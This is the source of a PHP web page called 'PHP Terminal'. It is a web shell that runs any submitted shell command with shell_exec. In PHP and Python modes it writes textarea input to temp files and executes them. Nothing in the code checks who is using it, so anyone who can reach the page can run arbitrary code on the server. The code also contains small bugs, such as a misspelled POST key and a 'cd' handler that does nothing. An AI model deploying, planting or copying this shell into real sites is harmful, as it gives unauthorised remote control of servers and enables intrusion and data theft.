<DOCTYPE html>
<html>
<head>
	<link href="style.css" rel="stylesheet">
	<link href='http://fonts.googleapis.com/css?family=Ubuntu' rel='stylesheet' type='text/css'>
	<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
</head>
<body>
	<div class="command">
	<form action="" method="post">
			<h2>PHP Terminal</h2>
			<?php echo getcwd();?>
			<input type="text" id="textbox" name="command">
			<input class="b"type="submit" value="Execute">
			<br>
			<br>
			<textarea name="commands" id="textbox"><?php
			$isStart = false;
			$isPython = ($_POST['type'] == "python");
			$isPHP = ($_POST['tyope'] == "php");

			try{
				if (strpos($_POST['command'], 'cd') !== false){
					echo(str_replace("cd", "", $_POST['command']));
					echo "<br>";
					echo getcwd();
				}else if($_POST['command'] == "python"){
					echo "[+]Python Shell Now Active\n";
					echo "[*]Type execute() to execute previous lines\n";
					echo "[*]Type quit() to quit python shell\n";
					$isStart = true;
					$isPython = true;
					$isPHP = false;

				}else if($_POST['command'] == "php"){
					echo "[+]PHP Shell Now Active\n";
					echo "[*]Type execute() to execute previous lines\n";
					echo "[*]Type quit() to quit php shell\n";
					$isStart = true;
					$isPython = false;
					$isPHP = true;
				}else{
			 		if ($_POST['type'] == 'php'){
			 			if ($_POST['command'] == "execute()"){
			 				$file = fopen("shell/temp.php", "w");
			 				fwrite($file, $_POST["commands"]);
			 				fclose($file);
			 				echo shell_exec("php shell/temp.php");
			 			}
			 			else if($_POST['command'] == "quit()"){
			 				echo shell_exec("clear");
			 				$isPHP = false;
			 			}
			 			else if ($_POST['isStart'] != true){
			 				echo $_POST["commands"];
			 			}

			 			if ($_POST["command"] != "execute()"){
			 				echo $_POST['command'] . "\n";
			 				$isPHP = true;
			 			}

			 		}else if ($_POST['type'] == 'python'){
			 			if ($_POST['command'] == "execute()"){
			 				$file = fopen("shell/temp.py", "w");
			 				fwrite($file, $_POST["commands"]);
			 				fclose($file);
			 				echo shell_exec("python shell/temp.py");
			 			}
			 			else if($_POST['command'] == "quit()"){
			 				echo shell_exec("clear");
			 				$isPython = false;
			 			}
			 			else if ($_POST['isStart'] != true){
			 				echo $_POST["commands"];
			 			}
			 			if ($_POST["command"] != "execute()"){
			 				echo $_POST['command'] . "\n";
			 				$isPython = true;
			 			}
			 		}else{
			 			echo shell_exec(escapeshellcmd($_POST['command']));
			 		}
			 	}
			 }catch(Exception $e){
			 	echo "[-] Command Has Failed.";
			 } 
			 ?></textarea>
			 <?php
			 echo '<input type="hidden" name="isStart" value="' . $isStart .'">';
			 if ($isPython){
			 	echo '<input type="hidden" name="type" value="python">';
			 }else if($isPHP){
			 	echo '<input type="hidden" name="type" value="php">';
			 }else{
			 	echo '<input type="hidden" name="type" value="false">';
			 }
			 ?>
	</form>
	</div>
	<script>
$(document).delegate('#textbox', 'keydown', function(e) { 
  var keyCode = e.keyCode || e.which; 

  if (keyCode == 9) { 
    e.preventDefault(); 
    var start = $(this).get(0).selectionStart;
    var end = $(this).get(0).selectionEnd;

    // set textarea value to: text before caret + tab + text after caret
    $(this).val($(this).val().substring(0, start)
                + "\t"
                + $(this).val().substring(end));

    // put caret at right position again
    $(this).get(0).selectionStart = 
    $(this).get(0).selectionEnd = start + 1;
  } 
});
	</script>
</body>
</html>